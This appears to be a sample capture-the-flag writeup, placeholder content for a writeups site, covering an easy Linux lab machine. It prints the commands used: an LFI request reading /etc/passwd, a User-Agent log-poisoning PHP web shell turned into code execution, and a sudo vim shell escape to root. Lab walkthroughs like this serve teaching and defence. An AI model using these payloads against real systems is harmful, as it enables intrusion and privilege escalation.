---
name: Specimen
platform: HTB
os: Linux
difficulty: easy
date: 2026-02-14
tags: web, lfi, sudo, sample
status: retired
---

# Specimen

A sample writeup so you can see exactly how the index renders. **Delete
this file** (`src/writeups-content/sample-machine.md`) once you've added
your own. The path was a textbook chain: exposed web app to local file
inclusion to a misconfigured `sudo` rule.

## Summary

- **Foothold:** LFI in a `page=` parameter, escalated to RCE via log poisoning
- **Privilege escalation:** passwordless `sudo` on a text editor
- **Key takeaway:** never trust user-controlled paths, and audit `sudo -l` religiously

## Recon

A full TCP scan showed only SSH and HTTP exposed:

```
nmap -sC -sV -p- --min-rate 5000 -oA specimen 10.10.11.42

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0
```

The web root served a brochure site whose navigation looked suspicious:
every page loaded through a single query parameter.

![Initial nmap scan and the suspicious page parameter](nmap.png)

## Foothold

The `page` parameter loaded templates directly off disk, with no
sanitisation — a classic **local file inclusion**:

```
curl -s "http://10.10.11.42/index.php?page=../../../../etc/passwd"
```

Poisoning the nginx access log with a `User-Agent` containing PHP, then
including that log, turned LFI into remote code execution:

```
curl -s "http://10.10.11.42/" -A "<?php system(\$_GET['c']); ?>"
curl -s "http://10.10.11.42/index.php?page=/var/log/nginx/access.log&c=id"
```

> The moment a file path is user-controlled, every readable file on the
> box is in scope — including the logs you write to yourself.

## Privilege Escalation

The web user could run an editor as root without a password:

```
sudo -l
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/vim
```

`vim` with root is an instant shell via its command mode:

```
sudo vim -c ':!/bin/sh'
```

## Root

```
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
```

![Root shell and the captured flag](root.png)

## Lessons

- Whitelist template names against a fixed allow-list; never pass user
  input to `include`
- `NOPASSWD` rules on any binary with a shell escape (`vim`, `less`,
  `find`, `awk`) are equivalent to handing out the root password
